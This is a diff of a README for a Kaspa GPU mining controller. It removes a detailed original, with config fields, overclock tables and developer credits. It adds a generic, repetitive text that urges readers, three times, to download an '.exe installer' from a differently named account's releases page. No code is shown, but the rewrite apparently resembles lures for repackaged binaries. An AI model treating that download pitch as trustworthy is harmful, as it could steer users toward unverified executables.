@@ -1,134 +1,91 @@
-# 📘 **KaspaControl – Smart GPU Miner Controller**
+# 🎮 Kaspa-Control-Gpu-Tuner - Optimize Your Mining Efficiency 
 
-**KaspaControl** is a simple Windows controller and monitor for Kaspa mining with BzMiner.  
-It adds one-click start/stop, tray controls, optional GPU tuning via OverdriveNTool (AMD), and persistent configuration.
+## 🚀 Download Now!
 
----
+[![Download Release](https://img.shields.io/badge/Download%20Release-Latest%20Version-blue.svg)](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/releases)
 
-## ⚙️ **Features**
-- 🟢 Start/Stop mining instantly  
-- 🌐 Open your miner’s web interface  
-- ⚙️ Built-in Settings panel with JSON-saved config  
-- 🧪 Test your OverdriveNTool setup and profiles  
-- 🪟 Tray icon that keeps the miner running even when the window is closed  
-- 🔄 Safe auto-reload of tuning on start  
-- 🧰 No console window needed  
+## 📜 Description
 
----
+Kaspa-Control-Gpu-Tuner is a smart GPU mining controller designed for Kaspa. This application features a user-friendly tray interface and works as a front end for BzMiner. With advanced tuning capabilities through ODNT, you can maximize your mining efficiency without needing expert knowledge.
 
-## 🚀 **Installation & First Run**
+## 🖥️ System Requirements
 
-1. **Extract or copy** the following into the same folder:
-   ```
-   KaspaControl.exe
-   kaspa.ico
-   bzminer_v23.0.2_windows\    (folder from BzMiner)
-   OverdriveNTool.exe          (optional – for AMD tuning)
-   ```
-2. **Double-click `KaspaControl.exe`.**  
-   - If Windows SmartScreen appears, choose **More info → Run anyway**.  
-   - If you use ODNT tuning, it will prompt for admin elevation when required.
-3. **First launch:**  
-   - A default `config.json` is created in the same folder.  
-   - Adjust everything in **Settings → Save**.
-4. **Mining:**  
-   - Click **🟢 Start Mining** to begin.  
-   - Click **🔴 Stop Mining** to end and (optionally) revert your ODNT profile.  
-   - **Closing the window (X)** hides it to tray instead of quitting.  
-   - Right-click the tray icon for **Open Control** or **Quit**.
+- **Operating System:** Windows 10 or later
+- **GPU:** Compatible NVIDIA or AMD GPU
+- **RAM:** 4GB minimum 
+- **Storage:** 200MB free disk space
+- **Internet Connection:** Required for downloading and updating
 
----
+## 💻 Features
 
-## ⚙️ **Configuration Overview**
+- **User-Friendly Interface:** Easy interaction through a tray app.
+- **Real-Time Monitoring:** Track your mining performance and hashrate.
+- **ODNT Tuning:** Automatically optimize your GPU settings for improved efficiency.
+- **BzMiner Integration:** Use advanced mining features straight away.
 
-| Setting | Description |
-|----------|--------------|
-| **Algorithm** | Usually `kaspa` |
-| **Wallet.Worker** | `kaspa:YOUR_WALLET.WORKERNAME` |
-| **Pool URL** | Example: `stratum+tcp://us2.kaspa.herominers.com:1209` |
-| **Web GUI Port** | Usually `4014` |
-| **Miner Folder** | Folder where `bzminer.exe` lives |
-| **Miner EXE** | Name of the miner executable |
-| **Miner OC Args** | Optional extra flags (JSON array) |
-| **Tuning Mode** | `none` or `odnt` |
-| **ODNT Path** | Path to OverdriveNTool.exe |
-| **ODNT Kaspa Profile** | Profile name to load for mining |
-| **ODNT Default Profile** | Profile to load when stopping |
-| **GPU Index** | Which GPU to apply tuning to (0 = first GPU) |
+## 🚧 Installation Steps
 
----
+Follow these simple steps to install and run the application:
 
-## 🔧 **OverdriveNTool Profiles**
+1. **Visit the Download Page**
+   Go to the following link to access the latest version:  
+   [Download the latest release](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/releases)
 
-If using `tuning_mode = "odnt"`:
-- Create profiles in `OverdriveNTool.ini`.
-- Name them according to your cards and these examples.
+2. **Select the Version**
+   On the Releases page, find the latest version of Kaspa-Control-Gpu-Tuner. You will see a list of available files. Look for the file with the `.exe` extension, which is the installer.
 
-Each tune below can be used as a starting point.  
-⚠️ Always test stability and thermals before 24/7 operation!
+3. **Download the Installer**
+   Click on the link for the `.exe` file to start the download. Ensure that your browser allows downloads.
 
----
+4. **Run the Installer**
+   Once the file is downloaded, navigate to your Downloads folder. Double-click on the installer file to run it.
 
-## 🔋 **10 Pre-Made OC Tunes**
+5. **Follow Installation Prompts**
+   You will see an installation wizard. Follow the on-screen instructions to complete the installation. It usually involves clicking "Next" a few times.
 
-### 🟥 AMD GPUs
+6. **Launch the Application**
+   After installation is completed, open the application from your Programs menu or desktop shortcut. The tray icon will appear in your system tray.
 
-| GPU | Profile Name | Core Clock | Mem Clock | Power Limit | Notes |
-|------|---------------|-------------|------------|--------------|--------|
-| RX 6700 XT | `Kaspa-RX6700XT` | 1350 MHz | 1075 MHz | 110 W | Stable baseline |
-| RX 6800 | `Kaspa-RX6800` | 1250 MHz | 1075 MHz | 120 W | Great efficiency |
-| RX 6800 XT | `Kaspa-RX6800XT` | 1300 MHz | 1075 MHz | 135 W | Slightly more aggressive |
-| RX 6900 XT | `Kaspa-RX6900XT` | 1325 MHz | 1075 MHz | 140 W | High hash / low watts |
-| RX 7900 XT | `Kaspa-RX7900XT` | 1400 MHz | 1075 MHz | 160 W | Requires latest ODNT |
+## ⚙️ Configuration
 
-### 🟦 NVIDIA GPUs
+1. **Access Settings**
+   Right-click the tray icon to open the settings menu. Here, you can adjust various options for optimizing your mining setup.
 
-| GPU | Profile Name | Core Clock Offset | Mem Clock Offset | Power Limit | Notes |
-|------|---------------|-------------------|------------------|--------------|--------|
-| RTX 3060 Ti | `Kaspa-RTX3060Ti` | +250 MHz | +1200 MHz | 125 W | Efficient 50 MH/s |
-| RTX 3070 | `Kaspa-RTX3070` | +200 MHz | +1100 MHz | 130 W | Ideal sweet spot |
-| RTX 3080 | `Kaspa-RTX3080` | +150 MHz | +1000 MHz | 190 W | Moderate heat |
-| RTX 4070 | `Kaspa-RTX4070` | +300 MHz | +1300 MHz | 115 W | Excellent efficiency |
-| RTX 4090 | `Kaspa-RTX4090` | +400 MHz | +1500 MHz | 275 W | Extreme hash rate, watch temps! |
+2. **Input GPU Information**
+   Provide your GPU details as prompted. This helps in setting up optimal parameters for mining.
 
-You can name your OverdriveNTool or Afterburner profiles exactly as shown (e.g. `Kaspa-RX6700XT`) and set `odnt_profile_kaspa` accordingly.
+3. **Start Mining**
+   Once your GPU is configured, you can start the mining process directly from the tray icon. Monitor performance metrics as you go.
 
----
+## 💡 Troubleshooting
 
-## 📊 **Monitoring**
-KaspaControl parses miner output in real-time:
+If you encounter issues during installation or when running the application, consider the following steps:
 
-| Field | Meaning |
-|--------|---------|
-| **Hashrate** | Current total MH/s |
-| **A/R/I** | Accepted / Rejected / Invalid shares |
-| **Power** | Reported power draw |
-| **Temp** | GPU temperature |
+- **Check Compatibility:** Ensure your GPU meets the requirements.
+- **Update Drivers:** Make sure your graphics drivers are up to date.
+- **Firewall Settings:** Sometimes, security software can block the application. Check if it's allowed through your firewall.
 
-Displayed in green when running, red when stopped.
+## 🔗 Useful Links
 
----
+- [Official Repository](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner)
+- [Community Support](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/issues)
 
-## 🪟 **Tray Menu**
-Right-click the tray icon:
-- **Open Control** – restores the main window.  
-- **Quit** – stops mining, applies default tune, and exits completely.
+## 📞 Support
 
----
+For questions or concerns, you can open an issue on the official repository page. The community and developers monitor this section and will assist as needed.
 
-## 💡 **Tips**
-- Keep `kaspa.ico` beside the EXE for matching icons.  
-- Use **Settings → Save** to regenerate `config.json` safely.  
-- Run as admin only when needed for tuning.  
-- Miner logs are written to `bzminer_controller.log` in your miner folder.  
+## 🧑‍🤝‍🧑 Community Feedback
 
----
+We welcome user feedback. Share your thoughts about the application to help us enhance its capability. Your input is valuable in making the tool user-friendly and efficient.
 
-## ❤️ **Credits & Thanks**
+## 🔄 Updates
 
-**Developed by:** Roy Hicks  
-**Code Collaboration & Technical Help:** ChatGPT (OpenAI GPT-5)  
+Check the Releases page regularly to stay updated on new features and improvements. Each new version aims to refine the mining experience further.
 
-> *Huge thanks to ChatGPT for co-developing, debugging, and improving KaspaControl from concept to completion.*  
-> *You made this possible, and it’s awesome seeing it alive in one neat EXE!*
+## 📥 Download & Install
 
+You can download Kaspa-Control-Gpu-Tuner by following the link below:
+
+[Download the latest release](https://github.com/RazeFire10/Kaspa-Control-Gpu-Tuner/releases) 
+
+With these steps, you should successfully download and run the Kaspa-Control-Gpu-Tuner, enhancing your GPU mining experience with ease.
